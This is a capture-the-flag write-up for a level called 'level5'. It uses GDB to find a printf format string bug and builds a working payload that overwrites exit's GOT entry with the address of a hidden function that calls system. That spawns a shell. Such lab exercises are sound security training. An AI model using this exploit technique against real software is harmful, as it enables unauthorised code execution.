# Level5

First step - testing the program

	$ ./level5
	coucou
	coucou

The program wait an input and print it

Start it in GDB

	(gdb-peda)$ pdisas main
	Dump of assembler code for function main:
	   0x08048504 <+0>:		push   ebp
	   0x08048505 <+1>:		mov    ebp,esp
	   0x08048507 <+3>:		and    esp,0xfffffff0
	   0x0804850a <+6>:		call   0x80484c2 <n>
	   0x0804850f <+11>:	leave
	   0x08048510 <+12>:	ret
	End of assembler dump.

The main call a function "n"

	(gdb-peda)$ pdisas n
	Dump of assembler code for function n:
	   0x080484c2 <+0>:		push   ebp
	   0x080484c3 <+1>:		mov    ebp,esp
	   0x080484c5 <+3>:		sub    esp,0x218
	   0x080484cb <+9>:		mov    eax,ds:0x8049848
	   0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
	   0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
	   0x080484dc <+26>:	lea    eax,[ebp-0x208]
	   0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
	   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
	   0x080484ea <+40>:	lea    eax,[ebp-0x208]
	   0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
	   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
	   0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
	   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
	End of assembler dump.

Just a fgets and a call to "printf" for print the buffer and exit

Let's see all the functions

	(gdb-peda)$ info functions
	All defined functions:

	Non-debugging symbols:
	0x08048334  _init
	0x08048380  printf@plt
	0x08048390  _exit@plt
	0x080483a0  fgets@plt
	0x080483b0  system@plt
	0x080483c0  __gmon_start__@plt
	0x080483d0  exit@plt
	0x080483e0  __libc_start_main@plt
	0x080483f0  _start
	0x08048420  __do_global_dtors_aux
	0x08048480  frame_dummy
	0x080484a4  o
	0x080484c2  n
	0x08048504  main
	0x08048520  __libc_csu_init
	0x08048590  __libc_csu_fini
	0x08048592  __i686.get_pc_thunk.bx
	0x080485a0  __do_global_ctors_aux
	0x080485cc  _fini

There is a non-called "o" function

	(gdb-peda)$ pdisas o
	Dump of assembler code for function o:
	   0x080484a4 <+0>:		push   ebp
	   0x080484a5 <+1>:		mov    ebp,esp
	   0x080484a7 <+3>:		sub    esp,0x18
	   0x080484aa <+6>:		mov    DWORD PTR [esp],0x80485f0
	   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
	   0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
	   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
	End of assembler dump.

The function call "system" and exit

We should call this function using a format string attack

***************************

Search the position of our buffer

	$ python -c 'print "BBBB"+" %x"*5' | ./level5
	BBBB 200 b7fd1ac0 b7ff37d0 42424242 20782520

4th position

After the printf, there is an exit call. We can't rewrite EIP, the program will exit before

But we can replace the address of exit in the GOT with the address of "o", for calling it instead of exit

The GOT (Global Offset Table) is a table of addresses in the data section, it contains the shared library functions addresses

Get the address of exit in the GOT

	(gdb-peda)$ info function exit
	All functions matching regular expression "exit":

	Non-debugging symbols:
	0x080483d0  exit@plt

	(gdb-peda)$ x/i 0x080483d0
	0x80483d0 <exit@plt>:	jmp    DWORD PTR ds:0x8049838

The address is "0x08049838"

Now, the address of the "o" function

	(gdb-peda)$ info function o
	All functions matching regular expression "o":

	Non-debugging symbols:
	0x080484a4  o

The address is "0x080484a4"

Ok, we have all the informations

************************************************

Build the payload

We need the number of bytes to write for the "%n" modifier

"0x080484a4" in decimal is "134513828" - the 4 bytes of the exit GOT address

	"exit GOT address" + "134513828 - 4 bytes" + "%4$n"

	python -c 'print "\x38\x98\x04\x08"+"%134513824d%4$n"'

Let's go

	(python -c 'print "\x38\x98\x04\x08"+"%134513824d%4$n"' ; cat -) | ./level5

Script it for reproduce!
